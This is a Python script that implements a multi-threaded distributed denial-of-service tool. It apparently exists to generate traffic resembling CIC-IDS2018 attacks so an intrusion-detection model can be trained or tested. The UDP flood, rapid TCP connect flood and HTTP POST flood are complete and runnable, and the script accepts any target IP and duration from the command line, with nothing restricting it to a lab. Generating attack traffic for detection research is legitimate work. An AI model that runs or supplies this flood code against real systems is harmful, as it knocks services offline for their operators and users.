"""
DDoS Attack - Distributed Denial of Service
Replicates CIC-IDS2018 DDoS attack tool behaviors:
  - LOIC-HTTP:  High-volume HTTP GET flood (many requests per persistent connection)
  - LOIC-UDP:   High-volume UDP flood to a FIXED port (all packets in same flow)
  - HOIC:       HTTP POST flood with large payloads (boosted LOIC variant)

Key differences from DoS: higher volume, more threads, and UDP flooding.
CICFlowMeter must see flows with very high packet counts and byte volumes.
"""

import socket
import threading
import time
import random
import string

# TCP receive buffer sizes → Init Fwd Win Byts feature.
# Values derived from CICIDS2018 training data per-class medians.
# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
#
# DDoS training data is 99.7% HOIC (n=686K) + 0.3% LOIC-UDP (n=1730).
# There is NO LOIC-HTTP in the training data at all!
# All TCP DDoS should match the HOIC profile.
#
# HOIC training data (n=411K, Wed-21-02-2018):
#   Init Fwd Win Byts: median=32738, p5=32738, p95=65535
#   Tot Fwd Pkts: median=2 (short connections)
#   TotLen Fwd Pkts: median=0 (most have no payload)
#   Flow Duration: median=9880 µs (~10ms)
#   Fwd Pkts/s: median=243
#   Fwd Seg Size Min: 20 (HOIC used no TCP timestamps)
#
_RCVBUF_HOIC = 32738          # HOIC training median: 32738 (standard Windows default)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class DDoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.packet_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.packet_count += n

    # ──────────────────────────────────────────────────────
    # LOIC-UDP — High-volume continuous UDP stream
    #
    #   CICIDS2018 training data (n=1730, Wed-21-02-2018):
    #     Tot Fwd Pkts:    median=119,758 (massive continuous stream!)
    #     TotLen Fwd Pkts: median=3,832,272
    #     Flow Duration:   median=119,777,312 µs (~120 sec)
    #     Fwd Pkts/s:      median=1016
    #     Fwd Pkt Len Mean: 32 (fixed small packets)
    #     Protocol: 17 (UDP)
    #     Tot Bwd Pkts: 0 (unidirectional)
    #
    #   The training data shows LOIC-UDP sends ~1000 small UDP
    #   packets/sec continuously for ~2 minutes. Each flow has
    #   ~120K packets because CICFlowMeter groups all packets to
    #   the same dst IP:port into one long flow.
    # ──────────────────────────────────────────────────────
    def udp_flood(self):
        """LOIC-UDP: Send continuous stream of small UDP packets.
        Each CICFlowMeter flow accumulates ~120K packets over ~2 minutes,
        matching the training data profile of massive continuous streams."""
        end_time = time.time() + self.duration
        udp_port = self.target_port if self.target_port != 80 else 80

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                # Send continuous stream of small packets (~1000/sec for ~30 sec)
                # CICFlowMeter groups these into one long flow
                stream_duration = min(30, self.duration)
                stream_end = time.time() + stream_duration
                
                while self.running and time.time() < stream_end:
                    # Small fixed-size payload (32 bytes, matching training Pkt Len Mean=32)
                    payload = random.randbytes(32) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(32))
                    try:
                        sock.sendto(payload, (self.target_ip, udp_port))
                        self._inc_count()
                    except Exception:
                        break
                    
                    # ~1000 packets/sec (matching training Fwd Pkts/s median=1016)
                    time.sleep(random.uniform(0.0008, 0.0012))
                
                sock.close()
            except Exception:
                pass
            
            # Brief pause between streams
            time.sleep(random.uniform(0.5, 1.0))

    # ──────────────────────────────────────────────────────
    # HTTP Flood — HOIC-style rapid connection flood
    #
    #   NOTE: There is NO "LOIC-HTTP" label in CICIDS2018 training data.
    #   All TCP DDoS training data is HOIC (686K samples).
    #   Therefore this method mimics the HOIC profile.
    #
    #   HOIC training data (n=411K):
    #     Tot Fwd Pkts: median=2, TotLen Fwd Pkts: median=0
    #     Flow Duration: median=9880 µs (~10ms)
    #     Init Fwd Win Byts: median=32738
    #     Fwd Pkts/s: median=243
    #     ACK Flag Cnt: median=1
    #
    #   Most HOIC flows are short TCP connections with no payload
    #   (SYN+ACK+close pattern). ~60% have 0 payload.
    # ──────────────────────────────────────────────────────
    def http_flood(self):
        """HTTP flood: Rapid TCP connection flood matching HOIC profile.
        60% connect+close (no data), 40% send small HTTP request.
        Uses HOIC-matching SO_RCVBUF for Init Fwd Win Byts."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                
                sock.connect((self.target_ip, self.target_port))
                self._inc_count()

                # 60% connect+close (matching training median of 0 payload)
                # 40% send a small GET request
                if random.random() < 0.40:
                    path = f"/{_random_string(random.randint(6, 12))}?{_random_string(4)}={_random_string(8)}"
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{self.target_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    sock.sendall(req.encode())

                    # Brief drain
                    try:
                        sock.settimeout(0.05)
                        sock.recv(4096)
                    except socket.timeout:
                        pass

                sock.close()
            except Exception:
                pass
            
            # Rapid-fire (~10ms between connections, matching training Flow Duration)
            time.sleep(random.uniform(0.005, 0.015))

    # ──────────────────────────────────────────────────────
    # HOIC — Rapid TCP connection flood with occasional POST
    #
    # CICIDS2018 training data (n=411K, Wed-21-02-2018):
    #   Tot Fwd Pkts:    median=2 (short connections)
    #   TotLen Fwd Pkts: median=0 (most have no payload!)
    #   Fwd Seg Size Min: 20 (no TCP timestamps)
    #   Init Fwd Win Byts: median=32738
    #   Flow Duration:   median=9880 µs (~10ms)
    #   Fwd Pkts/s:      median=243
    #   ACK Flag Cnt:    median=1
    #   Dst Port: 80
    #
    # CRITICAL: Training shows 50%+ of HOIC flows have NO payload.
    # The attack overwhelms the server so most connections are
    # SYN+ACK+close with no data exchange.
    # ──────────────────────────────────────────────────────
    def hoic_flood(self):
        """HOIC: Rapid TCP connection flood, mostly connect+close.
        60% connect+close (no data), 40% send POST with payload.
        Matches training profile of median 0 payload, ~10ms flows."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                
                sock.connect((self.target_ip, self.target_port))
                self._inc_count()

                # 60% connect+close (matching training median of 0 payload)
                # 40% send POST (matching training p95 with data)
                if random.random() < 0.40:
                    body_size = random.randint(500, 8000)
                    body = _random_string(body_size)
                    path = f"/{_random_string(random.randint(5, 12))}"
                    req = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{self.target_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                    sock.sendall(req.encode())

                    # Drain response
                    try:
                        sock.settimeout(0.1)
                        sock.recv(4096)
                    except socket.timeout:
                        pass

                sock.close()
            except Exception:
                pass
            
            # Rapid-fire (~10ms between connections)
            time.sleep(random.uniform(0.005, 0.015))

    def run_attack(self, num_threads=10):
        """Run DDoS attack with multiple threads.
        Thread allocation: 4x HTTP-flood (HOIC-style), 3x HOIC, 3x LOIC-UDP
        NOTE: All TCP threads use HOIC profile since that's 99.7% of training data."""
        print(f"[DDoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DDoS] Techniques: HTTP-flood(4T) + HOIC(3T) + LOIC-UDP(3T)")
        print(f"[DDoS] Using {num_threads} threads (all TCP threads match HOIC profile)")

        # Weighted: HTTP flood and HOIC get more threads for higher flow rate
        weighted_techniques = [
            self.http_flood,   # Thread 0
            self.http_flood,   # Thread 1
            self.http_flood,   # Thread 2
            self.http_flood,   # Thread 3
            self.hoic_flood,   # Thread 4
            self.hoic_flood,   # Thread 5
            self.hoic_flood,   # Thread 6
            self.udp_flood,    # Thread 7
            self.udp_flood,    # Thread 8
            self.udp_flood,    # Thread 9
        ]

        threads = []
        for i in range(num_threads):
            technique = weighted_techniques[i % len(weighted_techniques)]
            t = threading.Thread(target=technique, name=f"DDoS-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DDoS] Attack completed in {elapsed:.2f}s — Sent {self.packet_count} packets")


def run_ddos(target_ip, target_port=80, duration=60, threads=10):
    """Convenience function to run DDoS attack"""
    attack = DDoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_ddos(target_ip, duration=duration)
    else:
        print("Usage: python _2_ddos_simulation.py <target_ip> [duration]")
